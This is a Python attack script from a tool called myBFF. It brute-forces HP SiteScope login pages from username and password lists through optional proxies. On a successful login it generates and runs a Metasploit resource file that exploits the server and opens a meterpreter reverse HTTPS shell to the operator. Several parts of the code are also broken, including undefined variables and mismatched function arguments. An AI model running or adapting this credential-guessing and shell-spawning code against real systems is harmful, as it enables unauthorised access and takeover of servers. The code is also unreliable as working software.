#! /usr/bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from requests import session
import requests
import re
from argparse import ArgumentParser
import os
import socket
import random
import time
import proxySelector

parser = ArgumentParser(description='Attack HP SiteScope Login')
parser.add_argument('--username', '-u', required=True, help='Username')
parser.add_argument('--userfile', '-U', help='Username File')
parser.add_argument('--password', '-p', required=True, help='Password')
parser.add_argument('--passfile', '-P', help='Password File')
parser.add_argument('--url', required=True, help='URL (Format: http://127.0.0.1:8000)')
parser.add_argument('--proxies', help='Comma-separated list of SOCKS proxies. (i.e., 127.0.0.1:9050,127.0.0.1:18085)')
parser.add_argument('--delay', '-d', default=60, help='Time delay (in seconds) between each password guess. (Used for password file only. Defaults to 60 seconds.)')

class SiteScopeBrute:
    def somethingCool(self, username, password, payload, url, cookies):
        host = url.split(":")[1]
        host = host.split("/")[2]
        port = url.split(":")[2]
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((host,int(port)))
        locIP = s.getsockname()[0]
        s.close()
        msfrf = open('msfresource.rc', 'w')
        msfrf.write('use exploit/windows/http/hp_sitescope_dns_tool\n')
        msfrf.write('set PAYLOAD windows/meterpreter/reverse_https\n')
        msfrf.write('set RHOST ' + host + '\n')
        msfrf.write('set RPORT ' + port + '\n')
        msfrf.write('set SITE_SCOPE_USER ' + config["USERNAME"] + '\n')
        msfrf.write('set SITE_SCOPE_PASSWORD ' + config["PASSWORD"] + '\n')
        msfrf.write('set LHOST ' + locIP + '\n')
        msfrf.write('set LPORT 8443\n')
        msfrf.write('set ExitOnSession false\n')
        msfrf.write('exploit\n')
        msfrf.close()
        os.system("msfconsole -r msfresource.rc")
        os.system("rm msfresource.rc")
    def connectTest(self, username, password, payload, url, cookies):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            proxyselector = proxySelector.proxySelector()
            proxy = proxyselector.proxySelect(proxies)
            if 'None' in str(proxy):
                resp1 = c.get(url + '/SiteScope/', verify=False)
                cookie1 = resp1.cookies['JSESSIONID']
                cookies = dict(JSESSIONID=cookie1)
                c.headers.update({'Host': url, 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': url + '/SiteScope/servlet/Main', 'Accept-Language': 'en-US,en;q=0.5'})
                c.cookies.clear()
                cpost = c.post(url + '/SiteScope/j_security_check', cookies=cookies, data=payload, allow_redirects=False, verify=False)
            else:
                resp1 = c.get(url + '/SiteScope/', verify=False, proxies=proxy)
                cookie1 = resp1.cookies['JSESSIONID']
                cookies = dict(JSESSIONID=cookie1)
                c.headers.update({'Host': url, 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer': url + '/SiteScope/servlet/Main', 'Accept-Language': 'en-US,en;q=0.5'})
                c.cookies.clear()
                cpost = c.post(url + '/SiteScope/j_security_check', cookies=cookies, data=payload, allow_redirects=False, verify=False, proxies=proxy)
            if '200' in cpost:
                m = re.search("Incorrect user name or password", cpost.text)
                if m:
                    print("[-]  Login Failed for: " + username + ":" + password)
                else:
                    print("[+]  User Credentials Successful: " + username + ":" + password)
                    print("[!] Time to do something cool!")
                    self.somethingCool(username, password, payload, url, cookies)
            else:
                print "[-] An error has occurred..."

    def main(self, url, username, password, proxies, user_file, pass_file, delay):
        # Setup looping of username file and password files here
        # Setup Cookie info if needed
        cookies = {
            "cval":"4"
            }
        if pass_file:
            pass_lines = [pass_line.rstrip('\n') for pass_line in open(pass_file)]
            for pass_line in pass_lines:
                        if user_file:
                            lines = [line.rstrip('\n') for line in open(user_file)]
                            for line in lines:
                                username = line.strip('\n')
                                password = pass_line.strip('\n')
                                # Setup payload values
                                payload = {
                                    "j_username":username,
                                    "j_password":password
                                    }
                                # Try to connect to see if valid login
                                self.connectTest(username, password, payload, url, cookies, proxies)
                            # Wait XX seconds to try next password loop (defaults to 60 seconds, configurable with --delay)
                            time.sleep(float(delay))
                        else:
                            password = pass_line.strip('\n')
                            # Setup payload values
                            payload = {
                                "j_username":username,
                                "j_password":password
                                }
                            # Try to connect to see if valid login
                            self.connectTest(username, password, payload, url, cookies, proxies)
                            # Wait XX seconds to try next password loop (defaults to 60 seconds, configurable with --delay)
                            time.sleep(float(delay))
        elif user_file:
            lines = [line.rstrip('\n') for line in open(user_file)]
            for line in lines:
                username = line.strip('\n')
                # Setup payload values
                payload = {
                    "j_username":username,
                    "j_password":password
                    }
                # Try to connect to see if valid login
                self.connectTest(username, password, payload, url, cookies, proxies)
        else:
            # Setup payload values
            payload = {
                "j_username":username,
                "j_password":password
                }
            # Try to connect to see if valid login
            self.connectTest(username, password, payload, url, cookies, proxies)

if __name__ == "__main__":
    args = parser.parse_args()
    # Setup arguments
    username = args.username
    password = args.password
    user_file = args.userfile
    pass_file = args.passfile
    delay = args.delay
    url = args.url
    s = SiteScopeBrute()
    s.main(url, username, password, proxies, user_file, pass_file, delay)

